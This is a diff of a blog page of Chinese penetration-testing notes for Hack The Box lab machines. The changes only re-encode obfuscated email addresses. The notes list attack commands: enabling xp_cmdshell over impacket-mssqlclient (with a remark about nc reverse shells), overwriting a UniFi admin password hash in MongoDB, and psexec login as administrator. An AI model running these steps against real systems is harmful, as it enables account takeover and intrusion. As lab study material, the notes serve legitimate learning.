@@ -250,7 +250,7 @@
 </blockquote>
 <h2 id="mkpasswd"><a href="#mkpasswd" class="headerlink" title="mkpasswd"></a>mkpasswd</h2><p>用于生成密码或其加密</p>
 <blockquote>
-<p>mkpasswd -m sha-512 <a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#117;&#x6e;&#x69;&#x66;&#x69;&#x65;&#x64;&#46;&#x68;&#116;&#x62;">administrator@unified.htb</a></p>
+<p>mkpasswd -m sha-512 <a href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#x74;&#111;&#x72;&#x40;&#x75;&#x6e;&#105;&#x66;&#x69;&#101;&#100;&#x2e;&#104;&#x74;&#x62;">administrator@unified.htb</a></p>
 </blockquote>
 <h1 id="渗透常见服务"><a href="#渗透常见服务" class="headerlink" title="渗透常见服务"></a>渗透常见服务</h1><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><blockquote>
 <p>telnet 192.168.0.196    &#x2F;&#x2F;直接连接远程 Telnet 服务器</p>
@@ -273,7 +273,7 @@
 <p>info    &#x2F;&#x2F;查看配置信息（看数据库信息）<br>select 0     &#x2F;&#x2F;选中数据库0<br>keys *     &#x2F;&#x2F;获取数据库中的所有键<br>get flag   &#x2F;&#x2F;获取flag</p>
 </blockquote>
 <h2 id="Microsoft-SQL-Server-ms-sql-s"><a href="#Microsoft-SQL-Server-ms-sql-s" class="headerlink" title="Microsoft SQL Server(ms-sql-s)"></a>Microsoft SQL Server(ms-sql-s)</h2><h3 id="常用命令-5"><a href="#常用命令-5" class="headerlink" title="常用命令"></a>常用命令</h3><blockquote>
-<p>&#x2F;usr&#x2F;bin&#x2F;impacket-mssqlclient ARCHETYPE&#x2F;<a href="mailto:&#115;&#x71;&#108;&#x5f;&#115;&#118;&#99;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#57;&#46;&#50;&#52;&#x31;&#46;&#x31;&#51;&#54;">sql_svc@10.129.241.136</a> -windows-auth     &#x2F;&#x2F;获取账号密码后利用mssqlclient脚本远程连接<br>进入命令行后的命令<br>help<br>enable_xp_cmdshell   &#x2F;&#x2F;只有sa用户才有权限开启  select is_srvrolemember(‘sysadmin’);   返回1，表示当前确实是sa用户权限。<br>xp_cmdshell “whoami”   &#x2F;&#x2F;一般进行nc反弹shell方便后续操作</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;impacket-mssqlclient ARCHETYPE&#x2F;<a href="mailto:&#115;&#113;&#108;&#x5f;&#115;&#118;&#99;&#x40;&#49;&#x30;&#46;&#x31;&#50;&#57;&#x2e;&#x32;&#x34;&#x31;&#46;&#x31;&#51;&#x36;">sql_svc@10.129.241.136</a> -windows-auth     &#x2F;&#x2F;获取账号密码后利用mssqlclient脚本远程连接<br>进入命令行后的命令<br>help<br>enable_xp_cmdshell   &#x2F;&#x2F;只有sa用户才有权限开启  select is_srvrolemember(‘sysadmin’);   返回1，表示当前确实是sa用户权限。<br>xp_cmdshell “whoami”   &#x2F;&#x2F;一般进行nc反弹shell方便后续操作</p>
 </blockquote>
 <h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="MariaDB"><a href="#MariaDB" class="headerlink" title="MariaDB"></a>MariaDB</h3><p>远程连接数据库</p>
 <blockquote>
@@ -284,7 +284,7 @@
 <p>show databases;<br>use htb;<br>show tables;<br>select * from config;</p>
 </blockquote>
 <h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><blockquote>
-<p>ps -aux | grep mongod  &#x2F;&#x2F;查看端口<br>mongo –port 27117 ace –eval “db.admin.find().forEach(printjson);”  &#x2F;&#x2F;从UniFi应用的默认数据库ace查询用户<br>mkpasswd -m sha-512 <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#111;&#114;&#x40;&#x75;&#110;&#105;&#x66;&#105;&#101;&#x64;&#x2e;&#104;&#x74;&#x62;">administrator@unified.htb</a>  &#x2F;&#x2F;由于x_shadow为$6开头表示密码加密方式为sha512，这里更新为我们设置的新密码<br>mongo –port 27117 ace –eval ‘db.admin.update({“_id”:ObjectId(“61ce278f46e0fb0012d47ee4”)},{$set:{“x_shadow”:”$6$22iADZmhfetDUPL3$Xfp4TiAYKcWgFqlnP9eNFyvI2eTF7QmoK9HFfXjKNsHEsAuZeih5YDM0k7&#x2F;iYJKXY5ta9LS7wymaU.s3cZt4p0”}})’   &#x2F;&#x2F;更新密码</p>
+<p>ps -aux | grep mongod  &#x2F;&#x2F;查看端口<br>mongo –port 27117 ace –eval “db.admin.find().forEach(printjson);”  &#x2F;&#x2F;从UniFi应用的默认数据库ace查询用户<br>mkpasswd -m sha-512 <a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#97;&#x74;&#x6f;&#x72;&#x40;&#x75;&#110;&#105;&#x66;&#105;&#x65;&#100;&#x2e;&#x68;&#x74;&#98;">administrator@unified.htb</a>  &#x2F;&#x2F;由于x_shadow为$6开头表示密码加密方式为sha512，这里更新为我们设置的新密码<br>mongo –port 27117 ace –eval ‘db.admin.update({“_id”:ObjectId(“61ce278f46e0fb0012d47ee4”)},{$set:{“x_shadow”:”$6$22iADZmhfetDUPL3$Xfp4TiAYKcWgFqlnP9eNFyvI2eTF7QmoK9HFfXjKNsHEsAuZeih5YDM0k7&#x2F;iYJKXY5ta9LS7wymaU.s3cZt4p0”}})’   &#x2F;&#x2F;更新密码</p>
 </blockquote>
 <h2 id="Amazon-S3"><a href="#Amazon-S3" class="headerlink" title="Amazon S3"></a>Amazon S3</h2><p>S3 存储桶</p>
 <h3 id="awscli"><a href="#awscli" class="headerlink" title="awscli"></a>awscli</h3><p>用于与 Amazon S3 服务进行交互的 API 命令集合</p>
@@ -324,7 +324,7 @@
 </blockquote>
 <h2 id="psexec连接目标主机-在提权获取管理员账号密码后连接"><a href="#psexec连接目标主机-在提权获取管理员账号密码后连接" class="headerlink" title="psexec连接目标主机 &#x2F;&#x2F;在提权获取管理员账号密码后连接"></a>psexec连接目标主机 &#x2F;&#x2F;在提权获取管理员账号密码后连接</h2><p>psexec是微软官方出的一个代替telnet进行远程连接的工具，所以一般不会被杀软杀掉 （之前的工具在实际环境中可能需要做免杀），但是还是可能会被防火墙挡住的 (当然我们这里不需要考虑)</p>
 <blockquote>
-<p>locate psexec<br>&#x2F;usr&#x2F;bin&#x2F;impacket-psexec <a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x69;&#115;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#64;&#49;&#x30;&#46;&#49;&#50;&#x39;&#46;&#x32;&#52;&#x31;&#x2e;&#x31;&#x33;&#x36;">administrator@10.129.241.136</a></p>
+<p>locate psexec<br>&#x2F;usr&#x2F;bin&#x2F;impacket-psexec <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x69;&#115;&#116;&#x72;&#x61;&#116;&#111;&#x72;&#x40;&#49;&#48;&#46;&#49;&#50;&#x39;&#46;&#x32;&#x34;&#49;&#46;&#x31;&#x33;&#x36;">administrator@10.129.241.136</a></p>
 </blockquote>
 <h2 id="host域名解析"><a href="#host域名解析" class="headerlink" title="host域名解析"></a>host域名解析</h2><p>在浏览器中输入[ip-address]后重定向到unika.htb，但是因为我们的host里没有这条域名解析，当然外面的DNS服务器也没有。所以要在我们的&#x2F;etc&#x2F;hosts里配置一下。</p>
 <blockquote>
